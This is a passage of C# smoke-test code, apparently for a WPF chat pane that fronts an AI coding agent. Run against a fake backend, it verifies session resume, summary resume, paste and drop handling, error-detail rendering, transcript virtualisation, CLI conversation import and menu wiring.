                var repliesAfterReopen = vm.Items.OfType<MessageItemViewModel>().Count(m => m.IsAssistant);
                vm.InputText = "still with me?";
                vm.SendCommand.Execute(null);
                await WaitUntilIdleAsync(vm, TimeSpan.FromSeconds(30)).ConfigureAwait(true);
                var reattachReplies = vm.Items.OfType<MessageItemViewModel>().Where(m => m.IsAssistant).ToList();
                var gotReattach = reattachReplies.Count > repliesAfterReopen
                    && !reattachReplies.Any(m => m.Text.Contains("[resumed", StringComparison.Ordinal));
                var reattachDetail = $"replies={repliesAfterReopen}->{reattachReplies.Count}, resumed={reattachReplies.Any(m => m.Text.Contains("[resumed", StringComparison.Ordinal))}";

                // Resume proof: reopening the saved conversation and sending again starts the backend
                // with ResumeConversationId, which the fake echoes as "[resumed <id>]". Same view-model
                // (its banner stays auto-allowed); done before the replay view-model below exists, so
                // that one isn't subscribed to the engine during this turn.
                // New Session FIRST: it opens a fresh backend session, which is what actually ends the
                // live one. Without it the reopen re-attaches (the check above) and there is nothing to
                // resume — the conversation is still loaded in the agent.
                vm.NewSessionCommand.Execute(null);
                vm.RestoreMostRecentSession();
                vm.InputText = "continue please";
                vm.SendCommand.Execute(null);
                await WaitUntilIdleAsync(vm, TimeSpan.FromSeconds(30)).ConfigureAwait(true);
                var gotResume = vm.Items.OfType<MessageItemViewModel>()
                    .Any(m => m.IsAssistant && m.Text.Contains("[resumed", StringComparison.Ordinal));

                // Summary-resume proof: inflate the saved session so it's "large" (the send-time banner
                // only appears when the full-vs-summary choice is worth it), reopen, send (which defers
                // behind the banner), then pick "resume from summary". The engine summarizes the
                // transcript in an isolated pass; the fresh session's first prompt carries a
                // <conversation-summary> block, which the fake echoes as "[summary-resume]".
                var latestId = store.List(workDir).First().Id;
                var big = store.Load(workDir, latestId)!;
                big.Log.Add(new TranscriptEntry { Role = "agent", Event = new AgentEventDto { Type = "text", Text = new string('.', 5000) } });
                store.Save(big);

                vm.NewSessionCommand.Execute(null); // same reason as above: the resume just made it live again
                vm.RestoreMostRecentSession();
                vm.InputText = "and continue from the recap";
                vm.SendCommand.Execute(null);                          // large + resumable → defers, shows banner
                vm.PendingResume?.ResumeSummaryCommand.Execute(null);  // choose summary → re-issues the send
                await WaitUntilIdleAsync(vm, TimeSpan.FromSeconds(30)).ConfigureAwait(true);
                var gotSummaryResume = vm.Items.OfType<MessageItemViewModel>()
                    .Any(m => m.IsAssistant && m.Text.Contains("[summary-resume]", StringComparison.Ordinal));

                // Pasted-image proof (issue #118): a real PNG through WPF's own paste pipeline lands as
                // a chip, renders through both templates, and rides the message it was attached to.
                // Before the session-switch check below, which wipes the transcript.
                var (gotImagePaste, imagePasteDetail) = await VerifyImagePasteAsync(vm, window).ConfigureAwait(true);

                // Attached-IDE-context proof (issue #73, rung 2): the composer's "Add" menu is wired,
                // built from the registered sources, offers an unavailable one disabled, and puts a
                // chip in the composer. Beside the paste check because it is the same shape of payload
                // and the same rule - and, like it, before the session switch wipes the transcript.
                var (gotAddContext, addContextDetail) =
                    await VerifyContextMenuAsync(vm, window).ConfigureAwait(true);

                // Drag-and-drop proof (#62): a dropped file's PATH lands in the composer, spelled
                // against the agent's root and undoable, while text dropped on the box stays the
                // TextBox's business. Beside the paste check for the same reason — before the
                // session-switch check below, which wipes the transcript.
                var (gotFileDrop, fileDropDetail) =
                    await VerifyFileDropAsync(vm, window, workDir).ConfigureAwait(true);

                // Session-switch cleanup proof: a pending permission does not survive a New-session switch
                // (banner cleared + stranded request cancelled). Last among this view-model's checks, since
                // it wipes the transcript; auto-allow detached so the request isn't answered before the switch.
                vm.PropertyChanged -= AutoAllow;
                var (gotPermissionCleared, permissionClearedDetail) =
                    await VerifyPermissionClearedOnSessionSwitchAsync(vm).ConfigureAwait(true);
                vm.PropertyChanged += AutoAllow;

                // Persistence proof: a fresh view-model restores the saved transcript from disk and
                // replays it, reproducing the user message, assistant text and the folded-in diff.
                var replayVm = new ChatViewModel(_engine!, new StartSessionRequest("fake", null, workDir, modeName, null), sessionStore: store);
                await replayVm.InitializeAsync().ConfigureAwait(true);
                replayVm.RestoreMostRecentSession();
                var replayedUser = replayVm.Items.OfType<MessageItemViewModel>().Any(m => m.IsUser && m.Text.Length > 0);
                var replayedAssistant = replayVm.Items.OfType<MessageItemViewModel>().Any(m => m.IsAssistant && m.Text.Length > 0);
                var replayedEdit = replayVm.Items.OfType<ToolItemViewModel>().Any(t => t.HasDiff);
                // The standalone edit card's completion status must replay too (toolDone is recorded),
                // so a restored transcript shows the pencil green rather than regressing to running.
                var replayedEditStatus = replayVm.Items.OfType<EditItemViewModel>()
                    .Any(e => e.Path == "kiro-notes.txt" && e.Status == ToolStatus.Success);
                // MCP-readiness notices are transient session status (not recorded), so the replayed
                // transcript must not resurrect them claiming liveness the restored session lacks.
                var gotPersisted = replayedUser && replayedAssistant && replayedEdit && replayedEditStatus && !McpNotice(replayVm);

                // Warm-start proof (issue #19): with nothing to restore, opening the chat pre-opens the
                // backend session (a free session/new — no prompt, nothing metered), so the backend's
                // MCP servers connect while the user is still typing. Observable offline as the fake's
                // readiness notice arriving with NO prompt ever sent on this view-model.
                var warmVm = new ChatViewModel(
                    _engine!, new StartSessionRequest("fake", null, workDir, modeName, null),
                    sessionStore: new FileSessionStore(Path.Combine(workDir, "sessions", "warm-proof")));
                await warmVm.InitializeAsync().ConfigureAwait(true);
                warmVm.RestoreMostRecentSession(); // empty history → warms the fresh session
                for (var i = 0; i < 100 && !McpNotice(warmVm); i++)
                    await Task.Delay(50).ConfigureAwait(true);
                var gotWarmStart = McpNotice(warmVm);

                // …and when that pre-open FAILS, it must say so. The warm start is invisible — no
                // spinner, nothing the user asked for — so a swallowed failure leaves the pane looking
                // ready until they type a prompt and get the error then (the reported gap: picking a
                // signed-out Kiro announced nothing). The refusal message is normally the fix, so it is
                // relayed verbatim. Re-warming the same broken selection must not repeat itself.
                var failEngine = new FailingStartEngine(_engine!, "Kiro isn't signed in. Run 'kiro-cli login'.");
                var warmFailVm = new ChatViewModel(
                    failEngine, new StartSessionRequest("fake", null, workDir, modeName, null),
                    sessionStore: new FileSessionStore(Path.Combine(workDir, "sessions", "warm-fail-proof")));
                await warmFailVm.InitializeAsync().ConfigureAwait(true);
                warmFailVm.RestoreMostRecentSession(); // empty history → warms, and the warm fails
                for (var i = 0; i < 100 && WarmFailureNotices(warmFailVm).Count == 0; i++)
                    await Task.Delay(50).ConfigureAwait(true);
                warmFailVm.WarmStartSession(); // same broken selection again — must stay at one notice
                await Task.Delay(200).ConfigureAwait(true);
                var warmFailNotices = WarmFailureNotices(warmFailVm);
                var gotWarmFailureReported =
                    warmFailNotices.Count == 1 &&
                    warmFailNotices[0].Kind == NoticeKind.Error &&
                    warmFailNotices[0].Text.Contains("kiro-cli login");

                // Error-detail proof (issue #82). A backend failure now carries the agent's own
                // account — its version, the error code, what it wrote to stderr this session — and
                // that only helps if the template actually draws it. This is the half no unit test can
                // reach: the view-model plumbing is pinned in ErrorNoticeTests, while a missing
                // resource key, a two-way binding onto a get-only property, or a DataTemplate that
                // silently renders nothing all fail at RENDER and nowhere else.
                //
                // The notice is added to the view-model directly rather than driven through the fake
                // backend, and the check is honest about what that proves: the template, not the
                // engine path. Teaching the fake to fail a turn would put an error in the transcript
                // that every other check here would then have to tolerate.
                var detailNotice = new NoticeItemViewModel(
                    "dispatch error",
                    NoticeKind.Error,
                    "kiro-cli: kiro-cli-chat 2.0.1\nJSON-RPC error code: -32603\n\n"
                        + "--- kiro-cli output this session (1 line) ---\n"
                        + "[INFO] Auth: --auth=acp-callback");
                vm.Items.Add(detailNotice);
                var gotErrorDetail = false;
                var errorDetailDiag = "no ChatView";
                if (window.Content is CodeWicket.UI.Views.ChatView detailView)
                {
                    var container = detailView.BringItemIntoView(detailNotice);
                    window.UpdateLayout();
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    var box = container is not null
                        ? FindDescendantOfType<System.Windows.Controls.TextBox>(container, t => t.IsReadOnly)
                        : null;

                    // The panel's visibility lives on the BORDER wrapping the box, not on the box —
                    // a collapsed ancestor leaves its child's own Visibility reading Visible, so
                    // probing the TextBox directly would call a hidden panel shown.
                    var panel = box?.Parent as System.Windows.FrameworkElement;
                    // Collapsed first: it must START closed, or every backend error dumps a session's
                    // stderr into the transcript unasked and buries what surrounds it.
                    var startsCollapsed = panel is null || panel.Visibility != Visibility.Visible;

                    detailNotice.IsExpanded = true;
                    window.UpdateLayout();
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);

                    gotErrorDetail = startsCollapsed
                        && box is not null
                        && panel!.Visibility == Visibility.Visible
                        // Read-only but SELECTABLE: this text exists to be pasted into a bug report.
                        && box.IsReadOnly
                        && box.Text.Contains("kiro-cli-chat 2.0.1", StringComparison.Ordinal)
                        && box.Text.Contains("-32603", StringComparison.Ordinal);
                    errorDetailDiag =
                        $"container={container?.GetType().Name ?? "null"}, box={(box is null ? "null" : "found")}, "
                        + $"panel={panel?.GetType().Name ?? "null"}, startsCollapsed={startsCollapsed}, "
                        + $"expandedVisibility={panel?.Visibility}, len={box?.Text.Length}";
                }

                // Render-cost trace (issue #86). The arithmetic is unit-tested; what cannot be reached
                // from there is whether a real streaming message ever produces a line — the sink being
                // consulted, the post-layout probe running, and the idle timer closing the episode.
                var (gotRenderCost, renderCostDetail) =
                    await VerifyRenderCostLogAsync(vm, window).ConfigureAwait(true);

                // Realisation trace + the plain-text waste (issue #86). After the render-cost check
                // because it SCROLLS: it walks the whole transcript to make the panel realise, which
                // would move the view out from under any check above that reads what is on screen.
                var (gotRealisation, realisationDetail) =
                    await VerifyRealisationLogAsync(vm, window).ConfigureAwait(true);

                // Where the UI thread's time actually goes (issue #86). Last of the three traces, and
                // the only one whose naming path depends on the runtime it is running on.
                var (gotDispatch, dispatchDetail) =
                    await VerifyDispatcherTraceAsync(vm, window).ConfigureAwait(true);

                // The typing dots animate only while shown (issue #86). The regression this guards is
                // INVISIBLE by construction: an animation left running on a hidden element looks exactly
                // like one that was stopped, while WPF keeps its animated render loop alive for the life
                // of the window — measured at ~120 render operations a second on an idle pane. Driven
                // through the panel's own Visibility because IsVisibleChanged is the wiring under test,
                // and asserted with ValueSource.IsAnimated, which is the only thing that distinguishes a
                // running animation from an opacity that merely happens to sit at the same number.
                var dots = FindDescendantByName(window, "TDot1") as UIElement;
                var dotsPanel = FindDescendantByName(window, "TypingDots") as FrameworkElement;
                var animatedWhileHidden = true;
                var animatedWhileShown = false;
                if (dots is not null && dotsPanel is not null)
                {
                    // BOTH states are driven, and hidden is driven FIRST rather than assumed. The first
                    // version read the resting state and called it "hidden" — but the fake backend may
                    // well be mid-turn here, so the dots were legitimately up and the check reported the
                    // very bug it exists to catch. Local values outrank the style triggers.
                    dotsPanel.Visibility = Visibility.Hidden;
                    window.UpdateLayout();
                    await Task.Delay(80).ConfigureAwait(true);
                    animatedWhileHidden = System.Windows.DependencyPropertyHelper
                        .GetValueSource(dots, UIElement.OpacityProperty).IsAnimated;

                    // The whole ancestor chain, because IsVisible is a property of the CHAIN: the
                    // working bar's own Border is Collapsed unless the agent is working, so showing the
                    // dots panel alone leaves IsVisible false and the check silently measures nothing.
                    // That is the wiring behaving correctly — the dots must not animate behind a
                    // collapsed bar either — so the harness has to satisfy it rather than route round it.
                    var forced = new List<FrameworkElement>();
                    for (DependencyObject? at = dotsPanel; at is not null;
                         at = System.Windows.Media.VisualTreeHelper.GetParent(at))
                    {
                        if (at is FrameworkElement element && element.Visibility != Visibility.Visible)
                        {
                            element.Visibility = Visibility.Visible;
                            forced.Add(element);
                        }
                    }
                    window.UpdateLayout();
                    await Task.Delay(80).ConfigureAwait(true);
                    animatedWhileShown = System.Windows.DependencyPropertyHelper
                        .GetValueSource(dots, UIElement.OpacityProperty).IsAnimated;

                    // Leave the pane as we found it, or later captures show a working bar that isn't.
                    foreach (var element in forced)
                        element.ClearValue(UIElement.VisibilityProperty);
                    dotsPanel.ClearValue(UIElement.VisibilityProperty);
                    window.UpdateLayout();
                }
                var gotTypingDots = dots is not null && dotsPanel is not null
                    && !animatedWhileHidden && animatedWhileShown;
                var typingDotsDetail =
                    $"dots={(dots is null ? "missing" : "found")}, panel={(dotsPanel is null ? "missing" : "found")}, "
                    + $"animatedWhileHidden={animatedWhileHidden}, animatedWhileShown={animatedWhileShown}";

                // Mid-turn steering proof (issue #70). Last, because it opens its own backend session
                // and the engine holds only one — everything above has finished with theirs by now.
                var (gotSteering, steeringDetail) =
                    await VerifySteeringAsync(workDir, modeName).ConfigureAwait(true);

                // Held mid-turn messages (issue #70), the other half of the same gesture: Enter waits
                // for the running tool call instead of aborting it. Same reason for being last.
                var (gotHeld, heldDetail) =
                    await VerifyHeldMessagesAsync(workDir, modeName).ConfigureAwait(true);

                // ---- LAST, deliberately (issue #148) ----------------------------------------------
                // Everything above reads a transcript this phase is about to churn: it pads the root to
                // 214 items so that restoring by ANCHOR and restoring by raw offset stop agreeing, and
                // that much virtualisation traffic leaves captured elements detached. Removing the
                // padding afterwards does not undo the recycling, so the only reliable place for it is
                // after every check that reads the transcript. See the note where it used to sit.
                // Drill-down proof (issue #148). The claim of this feature is not that navigation works -
                // that is view-model state and is pinned offline - but that the sub-view VIRTUALISES,
                // which no view-model assertion can see. Point the transcript's ItemsSource back at
                // something non-virtualizing and every unit test still passes while a 200-call fan-out
                // realises 200 containers again, which is the cost the whole thing exists to remove.
                //
                // So: build a fan-out far too big to draw, scroll AWAY FROM THE BOTTOM FIRST (or "back
                // restored the position" is trivially true at offset 0), drill in, count what WPF
                // actually realised, and come back.
                var gotDrillDown = false;
                var drillDetail = "not reached";
                var drillItems = FindDescendantByName(window, "TranscriptItems");
                if (asyncTask is not null && drillItems is UIElement drillItemsEl
                    && window.Content is CodeWicket.UI.Views.ChatView drillView
                    && drillView.TranscriptScrollForDiagnostics is { } drillScroll)
                {
                    // 26 are already there from the cap check above.
                    for (var i = asyncTask.Children.Count; i < 200; i++)
                        asyncTask.AddChild(new ToolItemViewModel("deep-" + i, "Read deep " + i, "read"));

                    // A long root transcript, removed again below so later phases see it unchanged. The
                    // difference between restoring an ANCHOR and restoring a raw offset is an
                    // extent-ESTIMATE effect, so it only exists over a stretch long enough that the panel
                    // is estimating rather than remembering.
                    var padding = new List<ChatItemViewModel>();
                    for (var i = 0; i < 120; i++)
                    {
                        var pad = new MessageItemViewModel(MessageRole.Assistant,
                            $"Padding message {i}. " + string.Join(" ",
                                Enumerable.Repeat("A sentence long enough to wrap more than once.", 6)));
                        padding.Add(pad);
                        vm.Items.Add(pad);
                    }
                    await SettleAsync(window).ConfigureAwait(true);

                    // Away from the bottom, through the INPUT - the transcript takes "the user is
                    // scrolling" from the gesture, never from the offset, so a bare IScrollInfo call is
                    // not a gesture and would leave the view still following.
                    drillView.JumpToLatestForDiagnostics();
                    await SettleAsync(window).ConfigureAwait(true);
                    for (var i = 0; i < 6; i++)
                    {
                        drillItemsEl.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                            System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                        {
                            RoutedEvent = UIElement.PreviewMouseWheelEvent,
                        });
                        drillScroll.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                            System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                        {
                            RoutedEvent = UIElement.MouseWheelEvent,
                        });
                    }
                    await SettleAsync(window).ConfigureAwait(true);
                    var offsetBefore = drillScroll.VerticalOffset;
                    var scrolledAway = offsetBefore < drillScroll.ScrollableHeight - 24;

                    // What the viewport is actually resting ON. Computed here rather than asked of the
                    // view, so the assertion below is a cross-check of the restore rather than a reading
                    // of the same field back.
                    (ChatItemViewModel? Item, double Top) TopOfViewport()
                    {
                        if (drillView.TranscriptPanelForDiagnostics is not { } panel)
                            return (null, 0);
                        (ChatItemViewModel? Item, double Top) best = (null, 0);
                        foreach (var child in panel.Children)
                        {
                            if (child is not FrameworkElement fe || fe.DataContext is not ChatItemViewModel item)
                                continue;
                            double y;
                            try { y = fe.TransformToAncestor(drillScroll).Transform(default).Y; }
                            catch (InvalidOperationException) { continue; }
                            if (best.Item is null || y <= 0)
                                best = (item, y);
                            if (y > 0)
                                break;
                        }
                        return best;
                    }

                    var (anchorBefore, anchorTopBefore) = TopOfViewport();
                    var anchorIndex = anchorBefore is null ? -1 : vm.Items.IndexOf(anchorBefore);

                    // In, through the view's own funnel - the same entry both gestures use, so this
                    // cannot pass over a funnel the UI has stopped reaching.
                    drillView.OpenChildTranscriptForDiagnostics(asyncTask);
                    await SettleAsync(window).ConfigureAwait(true);

                    var scoped = ReferenceEquals(vm.CurrentItems, asyncTask.Children)
                        && vm.IsDrilledIn && drillView.NavDepthForDiagnostics == 1;

                    // The row chrome WPF actually realised, counted the way the cap check counts it: the
                    // card Border carrying the row's context menu, which only our tool-row template
                    // builds. A ContentPresenter exists per item whether or not a template was found, so
                    // counting those would pass over a missing one.
                    var realisedChildren = CountDescendants<System.Windows.Controls.Border>(
                        window, b => b.ContextMenu is not null && asyncTask.Children.Contains(b.DataContext));
                    // Generous by design: the exact number depends on the window height and the panel's
                    // cache length, and the finding this guards against is 200, not 19-vs-23.
                    var virtualised = realisedChildren > 0 && realisedChildren < 60;

                    // The breadcrumb is the way back, so it has to be on screen and to name the path.
                    var crumbs = vm.Breadcrumb.Select(c => c.Label).ToList();
                    var crumbBar = FindDescendantByName(window, "BreadcrumbBar") as FrameworkElement;
                    var crumbShown = crumbBar is not null && crumbBar.IsVisible && crumbBar.ActualHeight > 0;

                    await SettleAsync(window).ConfigureAwait(true);
                    var stayedPut = ReferenceEquals(vm.CurrentItems, asyncTask.Children);

                    // ...and back, which must restore the ROW the user was on, not the offset it was at.
                    drillView.NavigateToDepthForDiagnostics(0);
                    await SettleAsync(window).ConfigureAwait(true);

                    var restoredOffset = drillScroll.VerticalOffset;
                    var backAtRoot = ReferenceEquals(vm.CurrentItems, vm.Items)
                        && !vm.IsDrilledIn && drillView.NavDepthForDiagnostics == 0;
                    var after = TopOfViewport();
                    // The same row, at the same place WITHIN it - not merely near the viewport top. The
                    // anchor is whatever the viewport was resting on, and a tall message is routinely
                    // scrolled well past its own start (measured here at 454px in), so demanding the row
                    // begin at the top would fail a restore that is exactly right. The tolerance is about
                    // one row's height rather than exact, because a virtualising panel's extent is an
                    // estimate that realisation corrects as it goes - the smoke has measured that
                    // estimate a fifth out.
                    var onTheSameRow = anchorBefore is not null
                        && ReferenceEquals(after.Item, anchorBefore)
                        && Math.Abs(after.Top - anchorTopBefore) < 90;
                    // ...and the offset genuinely moved, so "the same row" cannot have been reached by
                    // simply putting the old number back.
                    var offsetIsNoLongerTheAnswer = Math.Abs(restoredOffset - offsetBefore) > 40;

                    gotDrillDown = scrolledAway && scoped && virtualised && crumbShown
                        && crumbs.Count == 2 && stayedPut && backAtRoot
                        && onTheSameRow
                        && asyncTask.Children.Count == 200;
                    drillDetail = $"children={asyncTask.Children.Count} scrolledAway={scrolledAway} " +
                        $"scoped={scoped} realised={realisedChildren}/200 crumbs=[{string.Join(">", crumbs)}] " +
                        $"crumbShown={crumbShown} stayedPut={stayedPut} back={backAtRoot} " +
                        $"sameRow={onTheSameRow} (top={anchorTopBefore:F0}->{after.Top:F0}, idx={anchorIndex}) " +
                        $"offsetMoved={offsetIsNoLongerTheAnswer} " +
                        $"offset={offsetBefore:F0}->{restoredOffset:F0}/{drillScroll.ScrollableHeight:F0}";

                    // Leave the transcript as the later phases expect to find it.
                    foreach (var pad in padding)
                        vm.Items.Remove(pad);
                    drillView.JumpToLatestForDiagnostics();
                    await SettleAsync(window).ConfigureAwait(true);
                }


                // Parking on THE LAST ITEM (issue #218). Here rather than beside its sibling park check
                // because it REORDERS the transcript — nothing in the fake's turn is both the final item
                // and addressable by a permission, so it lifts the trailing edit card out and puts it
                // back — and run from that position it failed the CLI-import phase below. Same rule as
                // the drill-down phase above, reached by a different route: a phase that churns the
                // transcript runs after everything that reads it.
                //
                // AutoAllow is detached across it: by this point the smoke answers prompts for itself,
                // and this phase needs the banner to STAY UP long enough to measure the viewport it
                // shrinks. Reattached immediately, since the CLI-import phase below raises one too.
                vm.PropertyChanged -= AutoAllow;
                var (gotLastRowPark, lastRowParkDetail) = window.Content is CodeWicket.UI.Views.ChatView lastParkView
                    ? await VerifyParkOnLastRowAsync(vm, window, lastParkView).ConfigureAwait(true)
                    : (false, "chat view not hosted");
                vm.PropertyChanged += AutoAllow;

                // ---- LAST, and the strongest case for it in the whole file (issue #108) -----------
                // Picking up a conversation from the backend's own CLI REPLACES the transcript:
                // ClearForConversationSwap drops every item, every tool row, every edit key and every
                // navigation frame, and the conversation that renders afterwards is someone else's log.
                // The drill-down phase above only churns virtualisation, and that alone was enough to
                // fail an unrelated later phase 4-5 runs in 6 (see the note where it sits). Nothing
                // after this point could read the transcript and be reading the one it was written for,
                // so this phase has to be the end of the run.
                var gotCliImport = false;
                var cliImportDetail = "not reached";
                if (window.Content is CodeWicket.UI.Views.ChatView cliView)
                {
                    // The fake's CLI store holds exactly two conversations
                    // (FakeAgentProvider.ListBackendSessionsAsync). Save ONE OF THEM as ours first:
                    // every conversation this extension creates is also in the backend's own store, so
                    // without the dedupe the picker offers the user their own open conversation straight
                    // back as though it were foreign.
                    const string HeldId = "fake-session-recent";
                    const string ForeignId = "fake-session-older";

                    // The fake's third entry repeats HeldId's title on purpose, because the real
                    // backends do. Here the namesake is the one being deduped away, which makes this
                    // phase the only place that pins the ORDER of the two passes: dedupe first, then
                    // mark collisions. Marking first would leave this row wearing an id explaining a
                    // clash with a row that is no longer in the list.
                    const string TwinId = "fake-session-twin";
                    var mine = new PersistedSession
                    {
                        WorkspaceRootPath = workDir,
                        Title = "Wire up the settings page",
                        ProviderId = "fake",
                        ConversationId = HeldId,
                    };
                    mine.Log.Add(new TranscriptEntry { Role = "user", Text = "wire up the settings page" });
                    store.Save(mine);

                    // The popup's own listing is fire-and-forget, so one can still be out from an earlier
                    // phase - and a refresh that collides with it returns having listed nothing at all.
                    for (var i = 0; i < 20 && vm.BackendSessions.Count == 0; i++)
                    {
                        await vm.RefreshBackendSessionsAsync().ConfigureAwait(true);
                        if (vm.BackendSessions.Count == 0)
                            await Task.Delay(50).ConfigureAwait(true);
                    }

                    var offered = vm.BackendSessions.Select(s => s.Id).ToList();
                    // The exact SET is the assertion, not merely that the right one is present: a dedupe
                    // keyed on the wrong field (our own session id rather than the backend's
                    // conversation id) still returns a perfectly plausible list - it just returns both.
                    //
                    // "fake-session-brief" is here because it is the FILTER's control: a real
                    // conversation whose createdAt and updatedAt are milliseconds apart, which a rule
                    // resting on the clock alone would hide. "fake-session-unused" is absent for the
                    // opposite reason - it is the one the filter is for.
                    var deduped = offered.Count == 3
                        && offered.Contains(ForeignId) && offered.Contains(TwinId)
                        && offered.Contains("fake-session-brief")
                        && !offered.Contains(HeldId) && !offered.Contains("fake-session-unused")
                        && vm.HasCliSection;

                    // Its namesake was just removed, so nothing it is shown beside shares its title and
                    // it must carry no id. A stale marker here would be the visible symptom of marking
                    // having run against the pre-dedupe list.
                    var twinUnmarked = vm.BackendSessions
                        .FirstOrDefault(s => s.Id == TwinId)?.Disambiguator is null;

                    // Drilled into a fan-out FIRST, so "the import came back to the root" is a claim
                    // about the reset rather than a reading of a depth that was already 0 (issue #148).
                    var drilledFirst = false;
                    if (asyncTask is not null)
                    {
                        cliView.OpenChildTranscriptForDiagnostics(asyncTask);
                        await SettleAsync(window).ConfigureAwait(true);
                        drilledFirst = vm.IsDrilledIn && cliView.NavDepthForDiagnostics == 1;
                    }

                    var savedBefore = store.List(workDir).Count;
                    var cliRow = vm.BackendSessions.FirstOrDefault(s => s.Id == ForeignId);
                    if (cliRow is not null)
                    {
                        cliRow.ImportCommand.Execute(null);
                        // The import is async void behind a command, so the row's own IsImporting flag is
                        // the only completion signal there is - and it is set synchronously, before the
                        // first await, which is what makes waiting on it safe rather than a race.
                        for (var i = 0; i < 400 && cliRow.IsImporting; i++)
                            await Task.Delay(25).ConfigureAwait(true);
                        await SettleAsync(window).ConfigureAwait(true);
                    }

                    // Rendered through the ORDINARY replay, so an imported row is the row a live turn
                    // would have built. The fake's script is user -> tool start -> edit -> completion,
                    // and the edit FOLDS into the row its own call opened rather than adding a card.
                    var importedUser = vm.Items.OfType<MessageItemViewModel>().FirstOrDefault(
                        m => m.Role == MessageRole.User && m.Text.Contains(ForeignId));
                    var importedTool = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(
                        t => t.ToolCallId == "imported-tool-1");
                    var foldedDiff = importedTool?.DiffPath;
                    var importedCard = vm.Items.OfType<EditItemViewModel>().FirstOrDefault(
                        e => e.Path.EndsWith("Uploader.cs", StringComparison.OrdinalIgnoreCase));
                    var editShown = importedCard is not null
                        || (foldedDiff is not null
                            && foldedDiff.EndsWith("Uploader.cs", StringComparison.OrdinalIgnoreCase));
                    var rendered = importedUser is not null && importedTool is not null && editShown;

                    // Saved as one of ours, KEYED BY the conversation the backend just loaded - which is
                    // also the only thing that stops the picker offering it again next time.
                    var savedNow = store.List(workDir);
                    var savedIt = savedNow.Count == savedBefore + 1
                        && savedNow.Any(s => s.ConversationId == ForeignId);

                    // "No record" is a THIRD state, not allowed and not denied. An import never runs
                    // through the permission path at all, so the row has to say it holds no record
                    // rather than inheriting a mark from a decision that was never taken.
                    var permissionBlank = importedTool is not null
                        && importedTool.PermissionSettled && importedTool.Permission is null;

                    // The backend is holding this conversation right now - the import is what loaded it -
                    // so the next prompt is an ordinary send. A resume banner here would offer to reload
                    // context the agent already has, and charge a second full replay for it.
                    var stillLive = vm.SessionStartedForDiagnostics && !vm.HasPendingResume;

                    // ...and every navigation frame named a row the import has just destroyed.
                    var backAtRoot = cliView.NavDepthForDiagnostics == 0 && !vm.IsDrilledIn
                        && ReferenceEquals(vm.CurrentItems, vm.Items);

                    // An imported sub-agent row is childless - Claude keeps a sub-agent's own calls out
                    // of the replayed stream - so it must not offer to open a transcript with nothing in
                    // it. Reported rather than silently skipped when the script carries none: an
                    // assertion over an empty set is a pass that pins nothing.
                    var importedSubagent = vm.Items.OfType<ToolItemViewModel>()
                        .FirstOrDefault(t => t.IsSubagentLaunch);
                    var subagentNote = importedSubagent is null
                        ? "no sub-agent row in the scripted import (nothing asserted)"
                        : "canOpen=" + importedSubagent.CanOpenTranscript
                            + " children=" + importedSubagent.Children.Count;
                    var subagentOk = importedSubagent is null || !importedSubagent.CanOpenTranscript;

                    gotCliImport = deduped && twinUnmarked && drilledFirst && rendered && savedIt
                        && permissionBlank && stillLive && backAtRoot && subagentOk;
                    cliImportDetail =
                        $"offered=[{string.Join(",", offered)}] deduped={deduped} " +
                        $"twinUnmarked={twinUnmarked} section={vm.HasCliSection} " +
                        $"drilledFirst={drilledFirst} rendered={rendered} (user={importedUser is not null}, " +
                        $"tool={importedTool?.Title}, foldedDiff={foldedDiff}, card={importedCard?.Path}) " +
                        $"saved={savedIt} ({savedBefore}->{savedNow.Count}) permission={permissionBlank} " +
                        $"(settled={importedTool?.PermissionSettled}, "
                        + $"outcome={importedTool?.Permission?.Kind.ToString() ?? "(no record)"}) " +
                        $"live={stillLive} (started={vm.SessionStartedForDiagnostics}, " +
                        $"pendingResume={vm.HasPendingResume}) navDepth={cliView.NavDepthForDiagnostics} " +
                        $"backAtRoot={backAtRoot} subagent=[{subagentNote}]";
                }

                // ---- every header-menu item is actually WIRED (found dead 2026-08-26) -----------
                // A ContextMenu item binds Command through PlacementTarget.DataContext, and
                // PlacementTarget is NULL until the menu opens - so this cannot be read off the object
                // and the menu has to be opened for real, the same reason the edit-row menu above is.
                // A Command bound to a property that exists nowhere resolves to null with only a trace
                // message, which is how "Continue in a terminal…" shipped VISIBLE AND INERT: its
                // Visibility bound to a real property (CanContinueInTerminal) and its Command to one
                // that existed nowhere, on a clean build with its own tests green - they drove
                // BuildResumeCommand, so the STRING was right and nothing asked whether anything
                // invoked it.
                //
                // Asserted over EVERY item rather than that one, because the defect is a class: an item
                // is wired if it carries a Command or a Click handler, and one with neither is an
                // affordance that silently does nothing. Visibility is deliberately not filtered - a
                // hidden unwired item is the same bug waiting for the condition that reveals it.
                var gotHeaderMenuWired = false;
                var headerMenuDetail = "not reached";
                if (window.Content is CodeWicket.UI.Views.ChatView headerMenuView
                    && headerMenuView.FindName("ExportButton") is System.Windows.Controls.Button exportButton
                    && exportButton.ContextMenu is { } headerMenu)
                {
                    headerMenu.PlacementTarget = exportButton;
                    headerMenu.IsOpen = true;
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);

                    var unwired = new List<string>();
                    var wired = 0;
                    foreach (var item in headerMenu.Items.OfType<System.Windows.Controls.MenuItem>())
                    {
                        if (item.Header is not string header || header.Length == 0)
                            continue;
                        if (item.Command is null
                            && !HasRoutedHandler(item, System.Windows.Controls.MenuItem.ClickEvent))
                        {
                            unwired.Add(header);
                        }
                        else
                        {
                            wired++;
                        }
                    }

                    // Closed before anything else runs: a ContextMenu is its own top-level hwnd, the
                    // lesson --screenshot-cli-sessions cost a 180s gate timeout to learn.
                    headerMenu.IsOpen = false;
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);

                    // The count floor matters as much as the emptiness: a menu whose items failed to
                    // materialise would report nothing unwired, which is the false pass here.
                    gotHeaderMenuWired = wired >= 3 && unwired.Count == 0;
                    headerMenuDetail = $"wired={wired} unwired=[{string.Join(",", unwired)}]";
                }

                // The history picker's two tabs. Nothing in the view-model tests can see the wiring:
                // the panes' Visibility and the pills' IsChecked are XAML bindings, so deleting either
